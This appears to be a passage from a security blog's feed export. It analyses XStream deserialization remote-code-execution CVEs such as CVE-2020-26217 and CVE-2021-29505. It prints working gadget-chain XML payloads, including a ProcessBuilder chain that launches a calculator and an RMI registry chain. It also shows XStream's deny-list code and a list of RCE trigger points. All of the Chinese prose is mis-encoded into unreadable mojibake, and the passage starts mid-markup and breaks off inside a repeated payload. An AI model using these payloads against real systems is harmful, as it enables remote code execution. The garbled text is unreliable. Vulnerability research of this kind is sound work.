class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-6"><a href="#åˆ†æ-6" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é‡ç‚¹æ˜¯Wh1t3p1gå¸ˆå‚…BCELçš„ classLoaderçš„æ„é€ æ€è·¯åŠè¿‡ç¨‹ï¼Œå¯çœ‹å¸ˆå‚…åŸåšã€‚</p><h3 id="é»‘åå•ï¼š-7"><a href="#é»‘åå•ï¼š-7" class="headerlink" title="é»‘åå•ï¼š"></a>é»‘åå•ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern BCEL_CL = Pattern.compile(<span class="string">&quot;.*\\.bcel\\..*\\.util\\.ClassLoader&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern LAZY_ITERATORS = Pattern.compile(<span class="string">&quot;.*\\$LazyIterator&quot;</span>);</span><br><span class="line">denyTypeHierarchy(InputStream.class);</span><br><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.activation.DataSource&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-29505"><a href="#CVE-2021-29505" class="headerlink" title="CVE-2021-29505"></a>CVE-2021-29505</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;string&gt;foo&lt;&#x2F;string&gt;</span><br><span class="line">    &lt;string&gt;foo&lt;&#x2F;string&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;com.sun.jndi.rmi.registry.BindingEnumeration&gt;</span><br><span class="line">      &lt;ctx&gt;</span><br><span class="line">        &lt;environment&#x2F;&gt;</span><br><span class="line">        &lt;registry class&#x3D;&quot;sun.rmi.registry.RegistryImpl_Stub&quot; serialization&#x3D;&quot;custom&quot;&gt;</span><br><span class="line">          &lt;java.rmi.server.RemoteObject&gt;</span><br><span class="line">            &lt;string&gt;UnicastRef&lt;&#x2F;string&gt;</span><br><span class="line">            &lt;string&gt;127.0.0.1&lt;&#x2F;string&gt;</span><br><span class="line">            &lt;int&gt;1099&lt;&#x2F;int&gt;</span><br><span class="line">            &lt;long&gt;0&lt;&#x2F;long&gt;</span><br><span class="line">            &lt;int&gt;0&lt;&#x2F;int&gt;</span><br><span class="line">            &lt;long&gt;0&lt;&#x2F;long&gt;</span><br><span class="line">            &lt;short&gt;0&lt;&#x2F;short&gt;</span><br><span class="line">            &lt;boolean&gt;false&lt;&#x2F;boolean&gt;</span><br><span class="line">          &lt;&#x2F;java.rmi.server.RemoteObject&gt;</span><br><span class="line">        &lt;&#x2F;registry&gt;</span><br><span class="line">        &lt;host&gt;127.0.0.1&lt;&#x2F;host&gt;</span><br><span class="line">        &lt;port&gt;1099&lt;&#x2F;port&gt;</span><br><span class="line">      &lt;&#x2F;ctx&gt;</span><br><span class="line">      &lt;names&gt;</span><br><span class="line">        &lt;string&gt;aa&lt;&#x2F;string&gt;</span><br><span class="line">      &lt;&#x2F;names&gt;</span><br><span class="line">      &lt;nextName&gt;0&lt;&#x2F;nextName&gt;</span><br><span class="line">    &lt;&#x2F;com.sun.jndi.rmi.registry.BindingEnumeration&gt;</span><br><span class="line">    &lt;com.sun.jndi.rmi.registry.BindingEnumeration reference&#x3D;&quot;..&#x2F;com.sun.jndi.rmi.registry.BindingEnumeration&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">&lt;&#x2F;map&gt;</span><br></pre></td></tr></table></figure><h2 id="XStreamçš„é˜²å¾¡æªæ–½"><a href="#XStreamçš„é˜²å¾¡æªæ–½" class="headerlink" title="XStreamçš„é˜²å¾¡æªæ–½"></a>XStreamçš„é˜²å¾¡æªæ–½</h2><h3 id="é»‘åå•"><a href="#é»‘åå•" class="headerlink" title="é»‘åå•"></a>é»‘åå•</h3><p>åœ¨&gt;1.4.6ä¹‹åçš„ç‰ˆæœ¬ä¸­ï¼ŒXStreamå¼•å…¥äº†å®‰å…¨æœºåˆ¶ï¼Œä»¥é¿å…ååºåˆ—åŒ–é—®é¢˜ã€‚</p><p>Wh1t3p1gå¸ˆå‚…ã€Šå›é¡¾XStreamååºåˆ—åŒ–æ¼æ´ã€‹ä¸€æ–‡ä¸­0x03ä¸€èŠ‚ä¸­è§£é‡Šå¾—å¾ˆå¥½äº†ï¼Œè¿™é‡Œä¸èµ˜è¿°ã€‚è´´ä¸€ä¸‹å‚è€ƒã€2ã€‘ä¸­æåˆ°çš„æœ€æ–°ç‰ˆ1.4.16çš„é»‘åå•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String ANNOTATION_MAPPER_TYPE = <span class="string">&quot;com.thoughtworks.xstream.mapper.AnnotationMapper&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern GETTER_SETTER_REFLECTION = Pattern.compile(<span class="string">&quot;.*\\$GetterSetterReflection&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern PRIVILEGED_GETTER = Pattern.compile(<span class="string">&quot;.*\\$PrivilegedGetter&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern LAZY_ITERATORS = Pattern.compile(<span class="string">&quot;.*\\$LazyIterator&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern JAXWS_ITERATORS = Pattern.compile(<span class="string">&quot;.*\\$ServiceNameIterator&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern JAVAFX_OBSERVABLE_LIST__ = Pattern.compile(<span class="string">&quot;javafx\\.collections\\.ObservableList\\$.*&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern JAVAX_CRYPTO = Pattern.compile(<span class="string">&quot;javax\\.crypto\\..*&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern BCEL_CL = Pattern.compile(<span class="string">&quot;.*\\.bcel\\..*\\.util\\.ClassLoader&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">setupSecurity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.securityMapper != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.addPermission(AnyTypePermission.ANY);</span><br><span class="line">        <span class="keyword">this</span>.denyTypes(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;java.beans.EventHandler&quot;</span>, <span class="string">&quot;java.lang.ProcessBuilder&quot;</span>, <span class="string">&quot;javax.imageio.ImageIO$ContainsFilter&quot;</span>, <span class="string">&quot;jdk.nashorn.internal.objects.NativeString&quot;</span>, <span class="string">&quot;com.sun.corba.se.impl.activation.ServerTableEntry&quot;</span>, <span class="string">&quot;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&quot;</span>, <span class="string">&quot;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&quot;</span>, <span class="string">&quot;sun.swing.SwingLazyValue&quot;</span>&#125;);</span><br><span class="line">        <span class="keyword">this</span>.denyTypesByRegExp(<span class="keyword">new</span> Pattern[]&#123;LAZY_ITERATORS, GETTER_SETTER_REFLECTION, PRIVILEGED_GETTER, JAVAX_CRYPTO, JAXWS_ITERATORS, JAVAFX_OBSERVABLE_LIST__, BCEL_CL&#125;);</span><br><span class="line">        <span class="keyword">this</span>.denyTypeHierarchy(InputStream.class);</span><br><span class="line">        <span class="keyword">this</span>.denyTypeHierarchyDynamically(<span class="string">&quot;java.nio.channels.Channel&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.denyTypeHierarchyDynamically(<span class="string">&quot;javax.activation.DataSource&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.denyTypeHierarchyDynamically(<span class="string">&quot;javax.sql.rowset.BaseRowSet&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.allowTypeHierarchy(Exception.class);</span><br><span class="line">        <span class="keyword">this</span>.securityInitialized = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‡ªæ­¤ï¼ŒæŠŠåŸºäºjdkçš„ç°æœ‰å·²çŸ¥é“¾éƒ½blockæ‰äº†ã€‚ç¬¬ä¸‰æ–¹çš„é“¾ï¼ˆå¦‚Groovyï¼‰è¿˜åœ¨å­˜æ´»ä¸­ï¼Œä¹‹åçš„å‘å±•è¶‹åŠ¿ï¼Œä¸çŸ¥é“ä¼šä¸ä¼šç±»ä¼¼fastjson/jacksonä¹‹ç±»çš„ï¼Œå¼€å§‹æ¼«é•¿çš„blockä¸‰æ–¹é“¾ã€‚</p><h3 id="ç™½åå•"><a href="#ç™½åå•" class="headerlink" title="ç™½åå•"></a>ç™½åå•</h3><p>XStreamåœ¨1.4.10ç‰ˆæœ¬å¢åŠ äº†setupDefaultSecurityæ–¹å¼æ¥è®¾ç½®é»˜è®¤çš„ç™½åå•ï¼Œä»…é»˜è®¤æ”¯æŒåŸºç¡€ç±»çš„å®ä¾‹åŒ–ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬èŠ‚å¤ç°äº†1.4.6ä¹‹åçš„å‡ ä¸ªPOCï¼Œä¸»è¦æ˜¯è·Ÿè¸ªRCEæ¼æ´è§¦å‘ç‚¹ï¼Œè‡³äºé“¾æ˜¯å¦‚ä½•æ„é€ çš„æœ¬èŠ‚æœªåšç ”ç©¶ï¼Œè¿™ä¸ªä½œä¸ºä¸‹èŠ‚çš„å†…å®¹é‡ç‚¹ç ”ç©¶ç ”ç©¶ã€‚</p><p>è¿‡ç¨‹ä¸­é—ç•™äº†1ä¸ªç°åœ¨è§£å†³ä¸äº†çš„é—®é¢˜ï¼ŒCVE-2021-21347 8u60ä¸‹çš„URLClassLoaderæ„é€ å­˜åœ¨é—®é¢˜ï¼Œæœªè§£å†³ï¼Œå¦‚æœæœ‰å¤§ä½¬é‡åˆ°å¹¶è§£å†³ï¼Œæ±‚åˆ†äº«ï¼Œä¸èƒœæ„Ÿæ¿€ã€‚</p><h4 id="æ€»ç»“ä¸‹XStreamçš„ååºåˆ—åŒ–ç‰¹ç‚¹"><a href="#æ€»ç»“ä¸‹XStreamçš„ååºåˆ—åŒ–ç‰¹ç‚¹" class="headerlink" title="æ€»ç»“ä¸‹XStreamçš„ååºåˆ—åŒ–ç‰¹ç‚¹"></a>æ€»ç»“ä¸‹XStreamçš„ååºåˆ—åŒ–ç‰¹ç‚¹</h4><ol><li><p>åœ¨JavaåŸç”Ÿååºåˆ—åŒ–ä¸­ï¼Œå¯å®ä¾‹åŒ–çš„ç±»å¿…é¡»æ˜¯Serializableçš„ï¼Œä½†æ˜¯XStreamä¸å—é™åˆ¶æ‰€æœ‰ç±»éƒ½å¯ä»¥å®ä¾‹åŒ–ï¼Œè¿™ç‚¹å’Œfastjson/jacksonä¹‹ç±»çš„ä¸€æ ·ã€‚</p></li><li><p>fastjson/jacksonå®ç°ç±»å±æ€§èµ‹å€¼ï¼Œéƒ½æ˜¯é€šè¿‡getsettr/setsettræ¥å®ç°çš„ï¼ˆåªæ˜¯æœ‰äº›è°ƒç”¨æ¡ä»¶ä¸åŒï¼‰ï¼ŒXStreamæ˜¯é€šè¿‡Conveterçš„é€»è¾‘æ¥å®ç°ï¼ˆSerializableConveterä¹Ÿæ”¯æŒJavaåŸç”Ÿååºåˆ—åŒ–readObjectï¼‰ã€‚</p><ul><li>ä¸ºä»€ä¹ˆfastjson/jackson å­˜åœ¨jdkååºåˆ—åŒ–é“¾æ²¡æœ‰XStreamçš„å¤šï¼Ÿå› ä¸ºå¹¶ä¸æ˜¯æ‰€æœ‰çš„ç±»çš„å±æ€§éƒ½ä¸¥æ ¼å®ç°äº†get/setï¼Œå¯¼è‡´å¾ˆå¤šjdkç±»ä¸èƒ½å®Œå…¨è¿˜åŸã€‚</li></ul></li><li><p>XStreamçš„æŸäº›Conveteræ˜¯å­˜åœ¨é—®é¢˜çš„</p><ul><li>MapConverter/TreeSetConveter/TreeMapConveteréƒ½ä¼šè§¦å‘è¿™äº›é›†åˆ/è¡¨ å†…å…ƒç´ çš„å†…éƒ¨å‡½æ•°ï¼Œæ¯”å¦‚compareã€hashcodeã€equalè¿™äº›å‡½æ•°ã€‚</li><li>DynamicProxyConverter ä»£ç†ç±»ï¼ŒInvocationHandlerå¯æ§ï¼Œå¯¼è‡´ä¸€äº›invokeå­˜åœ¨RCEé£é™©çš„InvocationHandlerç±»ï¼Œå¦‚EventHandlerï¼Œå¯ä»¥åŠ ä»¥åˆ©ç”¨ã€‚</li></ul></li></ol><h4 id="æ€»ç»“ä¸‹RCEè§¦å‘ç‚¹"><a href="#æ€»ç»“ä¸‹RCEè§¦å‘ç‚¹" class="headerlink" title="æ€»ç»“ä¸‹RCEè§¦å‘ç‚¹"></a>æ€»ç»“ä¸‹RCEè§¦å‘ç‚¹</h4><ol><li>invoke å®ç°ä¸Šæœ‰é—®é¢˜çš„ InvokeHandlerï¼Œå¦‚<ul><li>EventHandler</li><li>æ­é…MethodClosureçš„ConvertedClosure</li></ul></li><li>hashCodeã€compareã€equalå®ç°æœ‰é—®é¢˜çš„Map/Set/Queueï¼Œå¦‚<ul><li>Expandoï¼ŒhashCodeæ­é…MethodClosureå¯ä»¥RCE</li><li>CVE-2021-21345 ServerTableEntry verifyæ–¹æ³•å¯RCE</li></ul></li><li>å­˜åœ¨invokeï¼Œä¸”methodã€objå¯æ§çš„classï¼ˆè¿™ä¸€ç±»æ™®éå­˜åœ¨ï¼‰<ul><li>CVE-2020-26217 ImageIO$ContainsFilterï¼Œfilteræ–¹æ³•å†…å¯æ§</li><li>CVE-2021-21344 Accessor$GetterSetterReflectionï¼Œgetæ–¹æ³•å¯æ§</li><li>CVE-2021-21351 IncrementalSAXSource_Xerces parseSomeæ–¹æ³•å†…invokeå¯æ§</li></ul></li><li>åˆ©ç”¨ClassLoaderå®ä¾‹åŒ–<ul><li>ServiceLoader$LazyIteratorï¼Œè°ƒç”¨ç‚¹ä¸ºClass.forName (name,initialize,loader) ï¼ŒæŒ‡å®šloaderä¸ºBCEL classLoaer</li><li>CVE-2021-21347ï¼Œè°ƒç”¨ç‚¹ä¸ºloader.loadClass(name).newInstance()ï¼Œåˆ©ç”¨java.net.URLClassLoaderåŠ è½½è¿œç¨‹jarç±»å¹¶å®ä¾‹åŒ–</li><li>CVE-2021-21350ï¼Œå’ŒLazyIteratorä¸€æ ·ï¼Œåˆ©ç”¨BCEL classLoader</li></ul></li></ol><h4 id="æ€»ç»“ä¸‹Bullet-ysomapæ¦‚å¿µ"><a href="#æ€»ç»“ä¸‹Bullet-ysomapæ¦‚å¿µ" class="headerlink" title="æ€»ç»“ä¸‹Bullet(ysomapæ¦‚å¿µ)"></a>æ€»ç»“ä¸‹Bullet(ysomapæ¦‚å¿µ)</h4><ol><li>ProcessBuilder.start() æ— å‚æ•°</li><li>Runtime.getRuntime().exec(cmd) æœ‰å‚</li><li>JdbcRowSetImpl.connect()/prepare()/getDatabaseMetaData()/setAutoCommit(var1) æ— å‚</li><li>MethodClosure.call() æ— å‚</li></ol><p>æœ‰å‚çš„caseæ¯”è¾ƒå°‘è§ï¼ŒGroovyConvertedClosureæ˜¯ä¸€ä¾‹</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://www.anquanke.com/post/id/204314">å›é¡¾XStreamååºåˆ—åŒ–æ¼æ´</a></li><li>[2] <a href="https://paper.seebug.org/1543/">Xstream ååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´æ·±å…¥åˆ†æ</a></li><li>[3] <a href="https://x-stream.github.io/CVE-2020-26217.html">CVE-2020-26217</a></li><li>[4] <a href="https://x-stream.github.io/CVE-2021-21344.html">CVE-2021-21344</a></li><li>[5] <a href="https://x-stream.github.io/CVE-2021-21345.html">CVE-2021-21345</a></li><li>[6] <a href="https://x-stream.github.io/CVE-2021-21346.html">CVE-2021-21346</a></li><li>[7] <a href="https://x-stream.github.io/CVE-2021-21347.html">CVE-2021-21347</a></li><li>[8] <a href="https://x-stream.github.io/CVE-2021-21350.html">CVE-2021-21350</a></li><li>[9] <a href="https://x-stream.github.io/CVE-2021-21351.html">CVE-2021-21351</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;å‰æ–‡å·²ç»è®²è¿‡XStreamçš„ååºåˆ—åŒ–ç‰¹æ€§åŠæ¼æ´äº§ç”Ÿçš„åŸå› ï¼Œä»¥åŠ&amp;lt;=1.4.6ç‰ˆæœ¬çš„å‡ ä¸ªgadgetï¼Œåœ¨æ­¤èƒŒæ™¯ä¸Šï¼Œæœ¬èŠ‚å‡†å¤‡å¤ç°æŠ«éœ²çš„å‡ ä¸ªRCE CVEï¼Œæ­£å‘åˆ†æä¸‹ã€‚&lt;/p&gt;
&lt;p&gt;XStreamå›¢é˜Ÿå¾ˆæœ‰æ„æ€ï¼Œå®‰å…¨å…¬å‘Šä¼šæŠŠPOCä¹Ÿå…¬å¼€ï¼Œå…·ä½“å¯ä»¥çœ‹&lt;a href=&quot;https://x-stream.github.io/security.html%E3%80%82&quot;&gt;https://x-stream.github.io/security.htmlã€‚&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;CVE-2020-26217&quot;&gt;&lt;a href=&quot;#CVE-2020-26217&quot; class=&quot;headerlink&quot; title=&quot;CVE-2020-26217&quot;&gt;&lt;/a&gt;CVE-2020-26217&lt;/h2&gt;&lt;p&gt;è¿™ä¸ªå…¶å®å°±æ˜¯Wh1t3p1gå¸ˆå‚…ä¸­æåˆ°çš„ç¬¬4ä¸ªImageIO gadgetï¼Œåœ¨marshalsec gadgets ImageIOä¸­ä¹Ÿæœ‰ï¼Œä¸‹é¢æ­£å‘è·Ÿè¸ªä¸‹ã€‚&lt;/p&gt;
&lt;h3 id=&quot;Wh1t3p1gå¸ˆå‚…çš„POC&quot;&gt;&lt;a href=&quot;#Wh1t3p1gå¸ˆå‚…çš„POC&quot; class=&quot;headerlink&quot; title=&quot;Wh1t3p1gå¸ˆå‚…çš„POC&quot;&gt;&lt;/a&gt;Wh1t3p1gå¸ˆå‚…çš„POC&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;map&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;entry&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;jdk.nashorn.internal.objects.NativeString&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;lt;flags&amp;gt;0&amp;lt;&amp;#x2F;flags&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;lt;value class&amp;#x3D;&amp;quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;dataHandler&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &amp;lt;dataSource class&amp;#x3D;&amp;quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;lt;is class&amp;#x3D;&amp;quot;javax.crypto.CipherInputStream&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;cipher class&amp;#x3D;&amp;quot;javax.crypto.NullCipher&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;lt;initialized&amp;gt;false&amp;lt;&amp;#x2F;initialized&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;lt;opmode&amp;gt;0&amp;lt;&amp;#x2F;opmode&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;lt;serviceIterator class&amp;#x3D;&amp;quot;javax.imageio.spi.FilterIterator&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;lt;iter class&amp;#x3D;&amp;quot;javax.imageio.spi.FilterIterator&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;iter class&amp;#x3D;&amp;quot;java.util.Collections$EmptyIterator&amp;quot;&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;next class&amp;#x3D;&amp;quot;java.lang.ProcessBuilder&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;command class&amp;#x3D;&amp;quot;java.util.Arrays$ArrayList&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        &amp;lt;a class&amp;#x3D;&amp;quot;string-array&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                          &amp;lt;string&amp;gt;open&amp;lt;&amp;#x2F;string&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                          &amp;lt;string&amp;gt;-a&amp;lt;&amp;#x2F;string&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                          &amp;lt;string&amp;gt;calculator.app&amp;lt;&amp;#x2F;string&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        &amp;lt;&amp;#x2F;a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;&amp;#x2F;command&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;redirectErrorStream&amp;gt;false&amp;lt;&amp;#x2F;redirectErrorStream&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;&amp;#x2F;next&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;lt;&amp;#x2F;iter&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  